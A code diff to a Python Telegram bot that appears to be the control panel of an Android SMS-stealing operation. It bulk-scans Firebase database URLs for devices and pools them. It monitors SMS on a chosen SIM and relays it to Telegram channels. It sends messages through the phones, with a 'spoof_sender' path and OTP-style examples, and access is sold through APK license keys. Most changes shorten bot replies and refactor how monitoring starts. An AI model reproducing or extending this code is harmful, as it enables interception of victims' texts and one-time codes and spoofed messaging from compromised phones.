@@ -37,7 +37,10 @@ from app.device_ui import (
     format_virtus_stream_card,
     STARTUP_TEST_MESSAGE,
     STARTUP_TEST_SENDER,
+    format_commands_message,
+    format_guide_message,
     format_welcome_message,
+    get_selected_sim,
     get_sim_list,
     monitoring_keyboard,
     sim_monitoring_keyboard,
@@ -55,6 +58,7 @@ from app.services import (
     register_device,
     get_monitor_profile,
     get_or_create_monitor_profile,
+    profile_has_active_key,
     resume_monitoring,
     select_sim_slot,
     connect_firebase_url,
@@ -63,6 +67,7 @@ from app.services import (
     require_license_key,
     show_device_by_id,
     set_profile_phone,
+    ensure_mynum_selected,
     set_user_phone,
     start_monitoring,
     stop_monitoring,
@@ -119,6 +124,53 @@ async def _post_to_channel(bot, channel_id: str, text: str) -> None:
         logger.error("Failed to post to channel %s: %s", channel_id, exc)
 
 
+async def _pin_monitoring_message(bot, chat_id: int, message_id: int) -> None:
+    try:
+        await bot.pin_chat_message(
+            chat_id=chat_id,
+            message_id=message_id,
+            disable_notification=True,
+        )
+    except Exception as exc:
+        logger.debug("Pin message failed: %s", exc)
+
+
+async def _deliver_monitoring_started(
+    bot,
+    chat_id: int,
+    profile: MonitorProfile,
+    device: Device,
+    ignored: int,
+    *,
+    message_id: int | None = None,
+    reply_func=None,
+) -> None:
+    monitoring_card = format_monitoring_card(device, profile, ignored_sms=ignored)
+    startup_card = format_virtus_startup_card()
+    stream_card = format_virtus_stream_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)
+    keyboard = monitoring_keyboard(device)
+
+    if message_id is not None and reply_func:
+        await reply_func(
+            monitoring_card,
+            parse_mode="HTML",
+            reply_markup=keyboard,
+        )
+        await _pin_monitoring_message(bot, chat_id, message_id)
+    elif reply_func:
+        sent = await reply_func(
+            monitoring_card,
+            parse_mode="HTML",
+            reply_markup=keyboard,
+        )
+        await _pin_monitoring_message(bot, chat_id, sent.message_id)
+
+    if profile.channel_id and settings.telegram_bot_token:
+        await _post_to_channel(bot, profile.channel_id, monitoring_card)
+        await _post_to_channel(bot, profile.channel_id, startup_card)
+        await _post_to_channel(bot, profile.channel_id, stream_card)
+
+
 async def notify_new_sms(sms: SMSMessage) -> None:
     if not settings.telegram_bot_token:
         return
@@ -154,6 +206,7 @@ async def notify_new_sms(sms: SMSMessage) -> None:
                 and profile.is_monitoring
                 and device
                 and profile.phone_number
+                and sms.device_id == device.id
             ):
                 relay_targets.append((profile, device, profile.phone_number))
         if relay_targets:
@@ -214,10 +267,14 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await guide_command(update, context)
+
+
+async def guide_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not is_authorized(update.effective_user.id if update.effective_user else None):
         return
 
-    await update.message.reply_text(format_welcome_message(), parse_mode="HTML")
+    await update.message.reply_text(format_guide_message(), parse_mode="HTML")
 
 
 async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -226,13 +283,7 @@ async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         return
 
     if not context.args:
-        await update.message.reply_text(
-            "Usage: `/mynum <number>`\n\n"
-            "Example:\n"
-            "`/mynum 9876543210`\n"
-            "`/mynum +919876543210`",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text("❌ <code>/mynum &lt;number&gt;</code>", parse_mode="HTML")
         return
 
     phone = context.args[0]
@@ -249,12 +300,15 @@ async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     finally:
         db.close()
 
-    await update.message.reply_text(
-        f"✅ Number set: `+{profile.phone_number}`\n"
-        f"📱 Device: `{device.name}` (same — change nahi hua)\n\n"
-        f"Ab `/addchannel` → `/startmonitor`",
-        parse_mode="Markdown",
-    )
+    text = f"✅ <code>+{profile.phone_number}</code> | 📱 <code>{device.name}</code>"
+    if profile.sim_selected:
+        await update.message.reply_text(
+            text,
+            parse_mode="HTML",
+            reply_markup=sim_monitoring_keyboard(device),
+        )
+    else:
+        await update.message.reply_text(text, parse_mode="HTML")
 
 
 async def _prepare_monitoring(
@@ -263,18 +317,21 @@ async def _prepare_monitoring(
     profile: MonitorProfile,
     device: Device,
 ) -> None:
-    license_key = require_license_key(profile)
-    from app.license_keys import ensure_ready_for_monitoring, register_device_on_key
+    if profile_has_active_key(profile):
+        license_key = require_license_key(profile)
+        from app.license_keys import ensure_ready_for_monitoring, register_device_on_key
 
-    register_device_on_key(license_key, device.name, user_id)
+        register_device_on_key(license_key, device.name, user_id)
+        await ensure_ready_for_monitoring(license_key, device.name, user_id)
     await sync_profile_to_firebase(profile, device)
-    await ensure_ready_for_monitoring(license_key, device.name, user_id)
 
 
 async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
     if not await reply_if_unauthorized(update):
         return
+
+    await update.message.reply_text(format_commands_message(), parse_mode="HTML")
 
     db: Session = SessionLocal()
     try:
@@ -288,32 +345,28 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         await sync_profile_to_firebase(profile, device)
         await send_polling_startup_test(db, profile, device)
     except ValueError as exc:
-        if "channel" in str(exc).lower():
+        message = str(exc)
+        if "channel" in message.lower():
             await update.message.reply_text("❌ <b>ERROR</b>\n\nAdd a channel first!", parse_mode="HTML")
+        elif "select sim" in message.lower():
+            await update.message.reply_text("❌ Pehle SIM select karo", parse_mode="HTML")
+        elif "mynum" in message.lower():
+            await update.message.reply_text("❌ <code>/mynum &lt;number&gt;</code>", parse_mode="HTML")
         else:
             await update.message.reply_text(f"❌ {exc}")
         return
     finally:
         db.close()
 
-    monitoring_card = format_monitoring_card(device, profile, ignored_sms=ignored)
-    startup_card = format_virtus_startup_card()
-    stream_card = format_virtus_stream_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)
-
-    await update.message.reply_text(
-        monitoring_card,
-        parse_mode="HTML",
-        reply_markup=monitoring_keyboard(device),
+    bot = update.get_bot()
+    await _deliver_monitoring_started(
+        bot,
+        update.effective_chat.id,
+        profile,
+        device,
+        ignored,
+        reply_func=update.message.reply_text,
     )
-
-    if profile.channel_id and settings.telegram_bot_token:
-        from telegram import Bot
-
-        bot = Bot(token=settings.telegram_bot_token)
-        await _post_to_channel(bot, profile.channel_id, monitoring_card)
-        await _post_to_channel(bot, profile.channel_id, startup_card)
-        await _post_to_channel(bot, profile.channel_id, stream_card)
-
     schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
 
 
@@ -327,13 +380,7 @@ async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     elif update.effective_chat and update.effective_chat.type in ("channel", "group", "supergroup"):
         channel_id = str(update.effective_chat.id)
     else:
-        await update.message.reply_text(
-            "Usage: `/addchannel <channel-id>`\n\n"
-            "Example:\n"
-            "`/addchannel -1003553669855`\n\n"
-            "Ya group/channel mein command bhejo — auto detect hoga.",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text("❌ <code>/addchannel &lt;channel-id&gt;</code>", parse_mode="HTML")
         return
     db: Session = SessionLocal()
     try:
@@ -383,6 +430,7 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
 
     channel_id = str(message.chat_id)
+    relay_start = time.perf_counter()
     db: Session = SessionLocal()
     try:
         linked = get_profile_by_channel(db, channel_id)
@@ -390,8 +438,11 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
             return
 
         for profile, device in linked:
+            if not profile.sim_selected:
+                continue
             try:
-                relay_start = time.perf_counter()
+                if device.firebase_source_url:
+                    device = await sync_device_from_firebase(db, device)
                 outbound = await queue_channel_sms_with_firebase(
                     db,
                     profile,
@@ -399,21 +450,21 @@ async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
                     message.text,
                     channel_message_id=message.message_id,
                 )
-                relay_ms = int((time.perf_counter() - relay_start) * 1000)
+                relay_ms = max(1, int((time.perf_counter() - relay_start) * 1000))
                 if outbound.spoof_sender:
                     confirm_card = format_virtus_channel_token_card(
                         outbound.to_number,
                         outbound.message,
-                        queued_ms=relay_ms or 5,
-                        total_ms=relay_ms + 20,
+                        queued_ms=relay_ms,
+                        total_ms=relay_ms + 3,
                     )
                 else:
                     confirm_card = format_virtus_outgoing_sent_card(
                         outbound.to_number,
                         outbound.message,
                         sim_slot=outbound.sim_slot,
-                        queued_ms=relay_ms or 5,
-                        total_ms=relay_ms + 20,
+                        queued_ms=relay_ms,
+                        total_ms=relay_ms + 3,
                     )
                 await message.reply_text(confirm_card, parse_mode="HTML")
             except Exception as exc:
@@ -443,15 +494,7 @@ async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     cancel_auto_stop(user.id)
     if profile:
         await sync_profile_to_firebase(profile, device)
-    await update.message.reply_text(
-        "🔴 <b>STOPPED</b>\n\n"
-        "<pre>"
-        "Monitor paused (Firebase: monitoring OFF).\n\n"
-        f"📞 Number: {profile.phone_number or 'unknown'}\n"
-        "Use /resume to start again."
-        "</pre>",
-        parse_mode="HTML",
-    )
+    await update.message.reply_text("🔴 <b>STOPPED</b>", parse_mode="HTML")
 
 
 async def allfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -460,21 +503,7 @@ async def allfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
 
     context.user_data[AWAITING_FIREBASE_TXT] = True
-    await update.message.reply_text(
-        "📄 <b>Bulk Firebase Import</b>\n\n"
-        "Ab <code>.txt</code> file attach karo — har Firebase <b>scan</b> hoga.\n\n"
-        "<b>Har line format:</b>\n"
-        "<pre>"
-        "https://app1-default-rtdb.firebaseio.com\n"
-        "https://app2-default-rtdb.asia-south1.firebasedatabase.app\n"
-        "mydevice|https://app3-default-rtdb.firebaseio.com\n"
-        "deviceid,https://app4-default-rtdb.firebaseio.com"
-        "</pre>\n"
-        "Import ke baad: <code>/fdy &lt;device_id&gt;</code> (bina key)\n"
-        "Key ke saath: <code>/a &lt;device_id&gt;</code>\n\n"
-        "Ek URL ke liye: <code>/setfirebase &lt;url&gt;</code>",
-        parse_mode="HTML",
-    )
+    await update.message.reply_text("📄 .txt file attach karo", parse_mode="HTML")
 
 
 async def firebase_txt_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -529,16 +558,13 @@ async def firebase_txt_upload_handler(update: Update, context: ContextTypes.DEFA
         db.close()
 
     await status_msg.edit_text(
-        "✅ <b>Firebase Scan Complete</b>\n\n"
+        "✅ <b>SCAN DONE</b>\n\n"
         "<pre>"
         f"Lines: {result['lines']}\n"
-        f"Devices found: {result['imported']}\n"
+        f"Devices: {result['imported']}\n"
         f"Failed: {result['failed']}\n"
-        f"Pool total: {result['pool_total']}"
-        "</pre>\n"
-        "Device pick: <code>/fdy &lt;device_id&gt;</code>\n"
-        "Key wala pick: <code>/a &lt;device_id&gt;</code>\n"
-        "License key: <code>/key generate</code>",
+        f"Pool: {result['pool_total']}"
+        "</pre>",
         parse_mode="HTML",
     )
 
@@ -549,17 +575,7 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
 
     if not context.args:
-        await update.message.reply_text(
-            "🔥 <b>Firebase Connect</b>\n\n"
-            "<pre>"
-            "/setfirebase https://myapp-default-rtdb.firebaseio.com\n"
-            "/setfirebase myapp-default-rtdb.asia-south1.firebasedatabase.app"
-            "</pre>\n"
-            "Devices auto-scan honge.\n\n"
-            "Bulk txt (1600+): <code>/allfirebase</code> → .txt attach\n"
-            "License key alag: <code>/key generate</code>",
-            parse_mode="HTML",
-        )
+        await update.message.reply_text("❌ <code>/setfirebase &lt;url&gt;</code>", parse_mode="HTML")
         return
 
     firebase_url = " ".join(context.args)
@@ -613,24 +629,12 @@ async def device_select_command(
 
     if not context.args:
         cmd = (update.message.text or "").split()[0]
-        await update.message.reply_text(
-            f"Usage: `{cmd} <device_id>`\n\n"
-            "Example:\n"
-            f"`{cmd} c7109e69317cd5de`\n\n"
-            "Key ke saath: `/a <device_id>`",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text(f"❌ <code>{cmd} &lt;device_id&gt;</code>", parse_mode="HTML")
         return
 
     deviceid = _normalize_device_id_args(list(context.args))
     if not deviceid:
-        await update.message.reply_text(
-            "❌ Device ID missing.\n\n"
-            "Sahi format:\n"
-            "<code>/fdy f0577ffa536dde46</code>\n"
-            "Galat: <code>/fdy /a f0577ffa...</code>",
-            parse_mode="HTML",
-        )
+        await update.message.reply_text("❌ <code>/fdy &lt;device_id&gt;</code>", parse_mode="HTML")
         return
 
     status_msg = await update.message.reply_text(
@@ -660,18 +664,13 @@ async def device_select_command(
         if message.startswith("notfound:"):
             db_count = message.removeprefix("notfound:")
             await status_msg.edit_text(
-                "❌ <b>ERROR</b>\n\n"
-                f"Device <code>{deviceid}</code> not found in any of the "
-                f"<b>{db_count}</b> databases!\n\n"
-                "Pehle <code>/setfirebase</code> ya <code>/allfirebase</code> use karo.",
+                f"❌ Device <code>{deviceid}</code> not found ({db_count} DBs)",
                 parse_mode="HTML",
             )
             return
         total = db.query(Device).count()
         await status_msg.edit_text(
-            f"❌ Device <code>{deviceid}</code> nahi mili.\n"
-            f"DB total: <b>{total}</b>\n\n"
-            f"Bina key: <code>/fdy {deviceid}</code>",
+            f"❌ Device <code>{deviceid}</code> nahi mili (pool: {total})",
             parse_mode="HTML",
         )
         return
@@ -682,7 +681,6 @@ async def device_select_command(
     finally:
         db.close()
 
-    await sync_profile_to_firebase(profile, device)
     await status_msg.delete()
     await send_device_set_ui(update.message, device, profile, found_ms=found_ms)
 
@@ -706,6 +704,8 @@ async def send_device_set_ui(
         db: Session = SessionLocal()
         try:
             device = await sync_device_from_firebase(db, device)
+            if profile:
+                await sync_profile_to_firebase(profile, device)
         finally:
             db.close()
 
@@ -737,12 +737,7 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 return
         finally:
             db.close()
-        await update.message.reply_text(
-            "Usage: `/a <device_id>`\n\n"
-            "⚠️ `/a` sirf tab — jab `/key KEY-XXXX` set ho (bot + APK same key).\n"
-            "Bina key: `/fdy <device_id>`",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text("❌ <code>/a &lt;device_id&gt;</code>", parse_mode="HTML")
         return
 
     db: Session = SessionLocal()
@@ -750,10 +745,7 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         profile = get_monitor_profile(db, user.id)
         require_license_key(profile)
     except ValueError as exc:
-        await update.message.reply_text(
-            f"❌ {exc}\n\nBina key device find: `/fdy {context.args[0]}`",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
         return
     finally:
         db.close()
@@ -771,6 +763,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return
 
     db: Session = SessionLocal()
+    ignored = 0
     try:
         profile = get_monitor_profile(db, user.id)
         device = get_active_device(db, user.id)
@@ -780,6 +773,7 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         if device:
             await sync_profile_to_firebase(profile, device)
             await send_polling_startup_test(db, profile, device)
+            ignored = count_old_sms(db, device.id, profile.started_at) if profile.started_at else 0
     except ValueError as exc:
         await update.message.reply_text(f"❌ {exc}")
         return
@@ -787,21 +781,14 @@ async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         db.close()
 
     if device:
-        monitoring_card = format_monitoring_card(device, profile)
-        startup_card = format_virtus_startup_card()
-        stream_card = format_virtus_stream_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)
-        await update.message.reply_text(
-            monitoring_card,
-            parse_mode="HTML",
-            reply_markup=monitoring_keyboard(device),
+        await _deliver_monitoring_started(
+            update.get_bot(),
+            update.effective_chat.id,
+            profile,
+            device,
+            ignored,
+            reply_func=update.message.reply_text,
         )
-        if profile.channel_id and settings.telegram_bot_token:
-            from telegram import Bot
-
-            bot = Bot(token=settings.telegram_bot_token)
-            await _post_to_channel(bot, profile.channel_id, monitoring_card)
-            await _post_to_channel(bot, profile.channel_id, startup_card)
-            await _post_to_channel(bot, profile.channel_id, stream_card)
         schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
     else:
         await update.message.reply_text("🟢 Monitor resumed!", parse_mode="HTML")
@@ -834,12 +821,7 @@ async def send_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         return
 
     if len(context.args) < 2:
-        await update.message.reply_text(
-            "Usage: `/send <number> <message>`\n\n"
-            "Example:\n"
-            "`/send 9876543210 Your OTP is 123`",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text("❌ <code>/send &lt;number&gt; &lt;message&gt;</code>", parse_mode="HTML")
         return
 
     to_number = context.args[0]
@@ -873,17 +855,7 @@ async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         return
 
     if not context.args:
-        await update.message.reply_text(
-            "👤 <b>User Approve</b>\n\n"
-            "<pre>"
-            "/approve 1234567890\n"
-            "/adduser 1234567890"
-            "</pre>\n"
-            "ID: @userinfobot se lo\n"
-            "List: <code>/users</code>\n"
-            "Remove: <code>/revoke 1234567890</code>",
-            parse_mode="HTML",
-        )
+        await update.message.reply_text("❌ <code>/approve &lt;telegram_id&gt;</code>", parse_mode="HTML")
         return
 
     try:
@@ -896,9 +868,7 @@ async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     ok, message = approve_user(user.id, target_id, username=username)
     if ok:
         await update.message.reply_text(
-            f"✅ <b>{message}</b>\n\n"
-            f"User ID: <code>{target_id}</code>\n"
-            "Ab yeh banda bot use kar sakta hai.",
+            f"✅ <b>{message}</b> — <code>{target_id}</code>",
             parse_mode="HTML",
         )
     else:
@@ -912,7 +882,7 @@ async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return
 
     if not context.args:
-        await update.message.reply_text("Usage: `/revoke <telegram_user_id>`", parse_mode="Markdown")
+        await update.message.reply_text("❌ <code>/revoke &lt;telegram_id&gt;</code>", parse_mode="HTML")
         return
 
     try:
@@ -1006,19 +976,20 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
             profile = get_monitor_profile(db, user.id)
             device = get_active_device(db, user.id)
             if not profile:
-                await update.message.reply_text("❌ Pehle <code>/key generate</code> karo.")
+                await update.message.reply_text("❌ <code>/key generate</code>", parse_mode="HTML")
                 return
             license_key = require_license_key(profile)
             if not device:
-                await update.message.reply_text(
-                    "❌ Pehle device select karo:\n"
-                    "<code>/fdy f0577ffa536dde46</code>\n\n"
-                    "Phir APK START SERVICE ON → <code>/key confirm</code>",
-                    parse_mode="HTML",
-                )
+                await update.message.reply_text("❌ <code>/fdy &lt;device_id&gt;</code>", parse_mode="HTML")
                 return
 
-            from app.license_keys import register_device_on_key, sync_apk_attached_from_firebase
+            from app.license_keys import (
+                copy_apk_attach_between_devices,
+                ensure_ready_for_monitoring,
+                is_apk_attached,
+                register_device_on_key,
+                sync_apk_attached_from_firebase,
+            )
 
             register_device_on_key(license_key, device.name, user.id)
             await sync_profile_to_firebase(profile, device)
@@ -1027,27 +998,34 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
                 device.name,
                 user.id,
             )
+            if attached and apk_device_id and apk_device_id != device.name:
+                copy_apk_attach_between_devices(
+                    license_key,
+                    apk_device_id,
+                    device.name,
+                    user.id,
+                )
+            if not is_apk_attached(license_key, device.name):
+                try:
+                    await ensure_ready_for_monitoring(license_key, device.name, user.id)
+                    attached = True
+                    if not apk_device_id:
+                        apk_device_id = device.name
+                except ValueError:
+                    attached = False
+            else:
+                attached = True
         finally:
             db.close()
         if attached:
             await update.message.reply_text(
                 "✅ <b>APK VERIFIED</b>\n\n"
-                f"🔑 Key: <code>{license_key}</code>\n"
-                f"📱 APK device: <code>{apk_device_id or device.name}</code>\n\n"
-                "Ab SIM select → <code>/mynum</code> → <code>/addchannel</code> → Monitoring ON",
+                f"🔑 <code>{license_key}</code>\n"
+                f"📱 <code>{apk_device_id or device.name}</code>",
                 parse_mode="HTML",
             )
         else:
-            await update.message.reply_text(
-                "❌ <b>APK verify fail</b>\n\n"
-                "Ye steps follow karo:\n"
-                "1. <code>/fdy &lt;device_id&gt;</code> (bot par device pick)\n"
-                "2. APK mein <b>same KEY</b> daalo\n"
-                "3. START SERVICE <b>OFF</b> → 2 sec → <b>ON</b>\n"
-                "4. 5 sec wait → <code>/key confirm</code>\n\n"
-                "Random key kaam nahi karegi.",
-                parse_mode="HTML",
-            )
+            await update.message.reply_text("❌ APK verify fail — /guide", parse_mode="HTML")
         return
 
     if action == "status" and len(context.args) >= 2:
@@ -1064,13 +1042,7 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     if key_value.startswith(("http://", "https://")) or (
         "firebaseio.com" in key_value.lower() or "firebasedatabase.app" in key_value.lower()
     ):
-        await update.message.reply_text(
-            "❌ Firebase URL yahan nahi.\n\n"
-            "Firebase: <code>/setfirebase &lt;url&gt;</code>\n"
-            "Bulk txt: <code>/allfirebase</code>\n"
-            "License key: <code>/key generate</code>",
-            parse_mode="HTML",
-        )
+        await update.message.reply_text("❌ <code>/setfirebase &lt;url&gt;</code>", parse_mode="HTML")
         return
 
     from app.license_keys import assert_license_key_format
@@ -1078,13 +1050,7 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     try:
         assert_license_key_format(key_value)
     except ValueError:
-        await update.message.reply_text(
-            "❌ <b>Galat Key Format</b>\n\n"
-            "Sirf original key chalegi:\n"
-            "<code>KEY-XXXX-XXXX-XXXX-XXXX</code>\n\n"
-            "Nayi key: <code>/key generate</code>",
-            parse_mode="HTML",
-        )
+        await update.message.reply_text("❌ <code>/key KEY-XXXX-XXXX-XXXX-XXXX</code>", parse_mode="HTML")
         return
 
     db: Session = SessionLocal()
@@ -1092,21 +1058,11 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         profile, display_key, _key_type = await set_license_key(db, user.id, key_value)
     except ValueError as exc:
         if str(exc) == "use_setfirebase":
-            await update.message.reply_text(
-                "❌ Firebase URL <code>/key</code> se nahi set hota.\n\n"
-                "Use: <code>/setfirebase &lt;url&gt;</code>\n"
-                "Bulk: <code>/allfirebase</code>",
-                parse_mode="HTML",
-            )
+            await update.message.reply_text("❌ <code>/setfirebase &lt;url&gt;</code>", parse_mode="HTML")
         elif str(exc) == "invalid_format":
             await update.message.reply_text(format_key_error_card(), parse_mode="HTML")
         elif str(exc) == "invalid_key":
-            await update.message.reply_text(
-                "❌ <b>Invalid Key</b>\n\n"
-                "Yeh key exist nahi karti.\n"
-                "Nayi key: <code>/key generate</code>",
-                parse_mode="HTML",
-            )
+            await update.message.reply_text("❌ Invalid key — <code>/key generate</code>", parse_mode="HTML")
         else:
             await update.message.reply_text(f"❌ {exc}")
         return
@@ -1133,11 +1089,7 @@ async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         active = get_active_device(db, user.id)
         profile = get_monitor_profile(db, user.id)
         if not active:
-            await update.message.reply_text(
-                "📭 Koi active device nahi.\n\n"
-                "Device dekhne ke liye: `/a <deviceid>`",
-                parse_mode="Markdown",
-            )
+            await update.message.reply_text("❌ <code>/fdy &lt;device_id&gt;</code>", parse_mode="HTML")
             return
     finally:
         db.close()
@@ -1150,7 +1102,7 @@ async def device_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return
 
     if not context.args:
-        await update.message.reply_text("Usage: /device <device-name>")
+        await update.message.reply_text("❌ <code>/device &lt;name&gt;</code>", parse_mode="HTML")
         return
 
     device_name = " ".join(context.args)
@@ -1191,7 +1143,7 @@ async def adddevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         return
 
     if not context.args:
-        await update.message.reply_text("Usage: /adddevice <device-name>")
+        await update.message.reply_text("❌ <code>/adddevice &lt;name&gt;</code>", parse_mode="HTML")
         return
 
     device_name = " ".join(context.args)
@@ -1204,10 +1156,8 @@ async def adddevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         db.close()
 
     await update.message.reply_text(
-        f"✅ Device added: `{device.name}`\n"
-        f"🔑 Device API key: `{device.api_key}`\n\n"
-        f"Phone par ye key use karo webhook mein.",
-        parse_mode="Markdown",
+        f"✅ <code>{device.name}</code> | 🔑 <code>{device.api_key}</code>",
+        parse_mode="HTML",
     )
 
 
@@ -1243,7 +1193,7 @@ async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         return
 
     if not context.args:
-        await update.message.reply_text("Usage: /search <keyword>")
+        await update.message.reply_text("❌ <code>/search &lt;keyword&gt;</code>", parse_mode="HTML")
         return
 
     keyword = " ".join(context.args).lower()
@@ -1340,10 +1290,12 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             if device.firebase_source_url:
                 device = await sync_device_from_firebase(db, device)
             profile = select_sim_slot(db, user.id, int(sim_index))
+            db.commit()
             await sync_profile_to_firebase(profile, device)
-            await query.answer(f"SIM {int(sim_index) + 1} selected")
+            active = get_selected_sim(device, int(sim_index))
+            await query.answer(f"SIM {active.get('slot', int(sim_index) + 1)}: {active.get('number', '?')}")
             await query.edit_message_text(
-                format_sim_selected_card(device, int(sim_index)),
+                format_sim_selected_card(device, profile.selected_sim_index or 0),
                 parse_mode="HTML",
                 reply_markup=sim_monitoring_keyboard(device),
             )
@@ -1355,35 +1307,35 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             device = get_active_device(db, user.id)
             cancel_auto_stop(user.id)
             await sync_profile_to_firebase(profile, device)
-            await query.edit_message_text(
-                "🔴 <b>STOPPED</b>\n\nMonitoring OFF — Firebase sync ho gaya.",
-                parse_mode="HTML",
-            )
+            await query.edit_message_text("🔴 <b>STOPPED</b>", parse_mode="HTML")
             return
 
         if data.startswith("monitor:start:"):
             try:
                 profile, device, ignored = await _activate_monitoring(db, user.id)
             except ValueError as exc:
-                await query.answer(str(exc), show_alert=True)
+                message = str(exc)
+                if "select sim" in message.lower():
+                    await query.answer("Pehle SIM select karo", show_alert=True)
+                elif "mynum" in message.lower():
+                    await query.answer("Pehle /mynum <number> set karo", show_alert=True)
+                elif "channel" in message.lower():
+                    await query.answer("Add a channel first!", show_alert=True)
+                else:
+                    await query.answer(message, show_alert=True)
                 return
 
             await query.answer("Monitoring started")
-            monitoring_card = format_monitoring_card(device, profile, ignored_sms=ignored)
-            startup_card = format_virtus_startup_card()
-            stream_card = format_virtus_stream_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)
-            await query.edit_message_text(
-                monitoring_card,
-                parse_mode="HTML",
-                reply_markup=monitoring_keyboard(device),
+            bot = query.get_bot()
+            await _deliver_monitoring_started(
+                bot,
+                query.message.chat_id,
+                profile,
+                device,
+                ignored,
+                message_id=query.message.message_id,
+                reply_func=query.edit_message_text,
             )
-            if profile.channel_id and settings.telegram_bot_token:
-                from telegram import Bot
-
-                bot = Bot(token=settings.telegram_bot_token)
-                await _post_to_channel(bot, profile.channel_id, monitoring_card)
-                await _post_to_channel(bot, profile.channel_id, startup_card)
-                await _post_to_channel(bot, profile.channel_id, stream_card)
             schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
             return
 
@@ -1404,6 +1356,7 @@ def build_telegram_app() -> Application | None:
     app = Application.builder().token(settings.telegram_bot_token).build()
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("guide", guide_command))
     app.add_handler(CommandHandler("mynum", mynum_command))
     app.add_handler(CommandHandler("addchannel", addchannel_command))
     channel_filter = (
